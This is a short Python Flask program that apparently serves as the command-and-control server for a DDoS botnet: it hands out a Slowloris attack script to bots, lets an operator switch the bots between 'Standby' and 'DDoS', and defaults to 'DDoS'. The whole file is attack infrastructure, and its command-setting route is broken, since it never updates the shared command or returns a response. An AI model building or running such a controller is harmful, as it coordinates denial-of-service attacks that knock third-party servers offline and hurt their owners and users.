from flask import Flask, request, send_file
import socket
import os

SLPort = "8888"

avail_commands = ["Standby", "DDoS"]

current_command = "DDoS"

app = Flask(__name__)

@app.route('/')
def home():
    return "Hello, world"
@app.route('/get_script')
def get_script():
    try:
        return send_file('/home/thang/Desktop/HTTPbot/slowloris.py', attachment_filename='slowloris.py')
    except Exception as e:
	    return str(e)

@app.route('/set_action', methods = ['POST'])
def set_action():
    body = request.get_json()
    if "command" in body and body["command"] in avail_commands:
        current_command = body["command"]


@app.route('/get_command', methods = ['GET'])
def get_command():
    return current_command


if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0')